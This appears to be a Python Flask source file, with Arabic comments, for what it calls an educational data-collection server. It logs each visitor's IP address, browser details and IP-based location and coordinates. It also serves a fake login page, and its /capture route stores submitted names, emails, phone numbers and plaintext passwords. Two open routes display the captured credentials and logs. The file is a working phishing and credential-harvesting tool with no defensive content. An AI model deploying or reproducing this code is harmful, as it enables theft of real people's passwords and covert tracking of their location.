from flask import Flask, request, render_template, jsonify
import datetime
import os
import requests

app = Flask(__name__)

# ========== الصفحة الرئيسية ==========
@app.route('/')
def home():
    return '''
    <h2>🌐 خادم جمع البيانات المتقدم - تجربة تعليمية</h2>
    <p>هذا الخادم يجمع بيانات متعددة عن الزوار لأغراض تعليمية</p>
    <hr>
    <p>🔗 الروابط المتاحة:</p>
    <ul>
        <li><a href="/collect">📊 جمع البيانات التقنية</a></li>
        <li><a href="/login">🔐 صفحة تسجيل الدخول (تجربة تصيد)</a></li>
        <li><a href="/view-logs">📄 عرض السجلات التقنية</a></li>
        <li><a href="/view-captured">📄 عرض البيانات المسجلة</a></li>
    </ul>
    '''

# ========== صفحة جمع البيانات التقنية ==========
@app.route('/collect')
def collect():
    # استخراج البيانات الأساسية
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    accept_lang = request.headers.get('Accept-Language')
    accept_encoding = request.headers.get('Accept-Encoding')
    referer = request.headers.get('Referer', 'لا يوجد')
    
    # تخمين نظام التشغيل
    os_info = "غير معروف"
    if "Android" in user_agent:
        os_info = "📱 Android"
    elif "iPhone" in user_agent or "iPad" in user_agent:
        os_info = "📱 iOS"
    elif "Windows" in user_agent:
        os_info = "💻 Windows"
    elif "Mac" in user_agent:
        os_info = "🍎 Mac"
    elif "Linux" in user_agent:
        os_info = "🐧 Linux"
    
    # جلب الموقع الجغرافي التقريبي من IP
    try:
        ip_response = requests.get(f'http://ip-api.com/json/{client_ip}?fields=status,country,city,lat,lon,isp,org,timezone')
        ip_data = ip_response.json()
        if ip_data['status'] == 'success':
            location = f"{ip_data.get('city', 'غير معروف')}, {ip_data.get('country', 'غير معروف')}"
            lat = ip_data.get('lat', 'غير متاح')
            lon = ip_data.get('lon', 'غير متاح')
            isp = ip_data.get('isp', 'غير معروف')
            timezone = ip_data.get('timezone', 'غير معروف')
        else:
            location = "غير متاح"
            lat = "غير متاح"
            lon = "غير متاح"
            isp = "غير متاح"
            timezone = "غير متاح"
    except:
        location = "خطأ في الجلب"
        lat = "خطأ"
        lon = "خطأ"
        isp = "خطأ"
        timezone = "خطأ"
    
    # تسجيل البيانات في ملف
    log_entry = f"""
    ═══════════════════════════════════════════
    📅 الوقت: {datetime.datetime.now()}
    🌐 IP المصدر: {client_ip}
    📍 الموقع التقريبي: {location}
    🗺️ الإحداثيات: {lat}, {lon}
    🕐 المنطقة الزمنية: {timezone}
    📡 مزود الخدمة: {isp}
    📱 نظام التشغيل: {os_info}
    🌍 اللغة: {accept_lang}
    🔧 الترميز: {accept_encoding}
    🔗 الصفحة السابقة: {referer}
    📝 User-Agent كامل:
       {user_agent}
    ═══════════════════════════════════════════
    """
    
    with open('log.txt', 'a', encoding='utf-8') as f:
        f.write(log_entry)
    
    # عرض الصفحة باستخدام القالب (أو كتابة HTML مباشرة)
    return render_template('collect.html', 
                         client_ip=client_ip,
                         os_info=os_info,
                         location=location,
                         isp=isp,
                         lat=lat,
                         lon=lon)

# ========== صفحة تسجيل الدخول الوهمية (التصيد) ==========
@app.route('/login')
def fake_login():
    return render_template('login.html')

# ========== مسار استقبال البيانات المسجلة ==========
@app.route('/capture', methods=['POST'])
def capture():
    fullname = request.form.get('fullname')
    email = request.form.get('email')
    phone = request.form.get('phone')
    password = request.form.get('password')
    
    # تسجيل البيانات في ملف
    with open('captured_data.txt', 'a', encoding='utf-8') as f:
        f.write(f"""
        ═══════════════════════════════════════════
        📥 بيانات تم جمعها - {datetime.datetime.now()}
        👤 الاسم الكامل: {fullname}
        📧 البريد الإلكتروني: {email}
        📱 رقم الهاتف: {phone}
        🔑 كلمة المرور: {password}
        🌐 IP المصدر: {request.remote_addr}
        📱 User-Agent: {request.headers.get('User-Agent')}
        ═══════════════════════════════════════════
        """)
    
    return render_template('capture_success.html')

# ========== عرض السجلات التقنية ==========
@app.route('/view-logs')
def view_logs():
    try:
        with open('log.txt', 'r', encoding='utf-8') as f:
            logs = f.read()
        return f'<pre style="background: #1e1e1e; color: #d4d4d4; padding: 20px; min-height: 100vh;">{logs}</pre>'
    except:
        return "<h2>لا توجد سجلات تقنية بعد</h2>"

# ========== عرض البيانات المسجلة من صفحة التصيد ==========
@app.route('/view-captured')
def view_captured():
    try:
        with open('captured_data.txt', 'r', encoding='utf-8') as f:
            data = f.read()
        return f'<pre style="background: #1e1e1e; color: #d4d4d4; padding: 20px; min-height: 100vh;">{data}</pre>'
    except:
        return "<h2>لا توجد بيانات مسجلة بعد</h2>"

# ========== تشغيل الخادم ==========
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)